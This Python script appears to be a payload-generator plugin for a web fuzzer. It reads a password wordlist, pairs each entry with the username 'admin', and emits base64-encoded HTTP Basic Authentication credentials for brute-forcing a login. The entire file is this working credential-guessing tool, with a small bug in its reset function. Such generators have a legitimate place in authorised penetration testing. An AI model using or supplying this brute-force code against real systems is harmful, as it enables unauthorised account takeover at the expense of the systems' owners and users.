# Auxiliary variables/constants for payload generation.

import base64;

INITIAL_VALUE = 0; # set this when you need to continue an interrupted fuzzing session 
count = INITIAL_VALUE;
user = str('admin');
passfile_path = 'C:\\Users\\user\\Documents\\wordlists\\passwords.txt';
NUMBER_OF_PAYLOADS = sum(1 for line in open(passfile_path));
passwd = list();
for line in open(passfile_path):    # initializing passwords into list
    passwd.append(line.rstrip());
print('NUMBER_OF_PAYLOADS = ' + str(NUMBER_OF_PAYLOADS));
print('len(passwd) = ' + str(len(passwd)));
print('count = '+str(count));


# The number of generated payloads, zero to indicate unknown number.
# The number is used as a hint for progress calculations.
def getNumberOfPayloads():
    return NUMBER_OF_PAYLOADS;


# Returns true if there are still payloads to generate, false otherwise.
# Called before each call to next().
def hasNext():
    return (count < NUMBER_OF_PAYLOADS);


# Returns the next generated payload.
# This method is called while hasNext() returns true.
def next():
    global count;
    print('next_count = ' + str(count));
    payload = count;
    print('payload = ' + str(payload));
    count+=1;
    print('incremented next_count = ' + str(count));
    print(user+':'+passwd[payload]);
    return base64.b64encode(user+':'+passwd[payload]);


# Resets the internal state of the payload generator, as if no calls to
# hasNext() or next() have been previously made.
# Normally called once the method hasNext() returns false and while payloads
# are still needed.
def reset():
    count = INITIAL_VALUE;


# Releases any resources used for generation of payloads (for example, a file).
# Called once the payload generator is no longer needed.
def close():
    pass;


